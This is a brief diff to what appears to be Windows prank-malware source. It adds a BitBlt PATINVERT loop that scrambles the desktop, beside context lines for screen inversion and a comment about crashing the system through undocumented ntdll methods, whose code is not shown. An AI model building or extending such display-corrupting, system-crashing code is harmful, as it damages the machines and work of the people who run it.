@@ -243,7 +243,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         InvertRgn(desk, hRegion);
         Sleep(50);
     }
-
+    for (int i = 1; i < 50; i++) {
+        BitBlt(desk, sin(i), cos(i), sw1, h, hdc, rand() % i * 50, y, PATINVERT);
+    }
 
 
     if (hNtdll != 0) { //crash system using undocumented methods
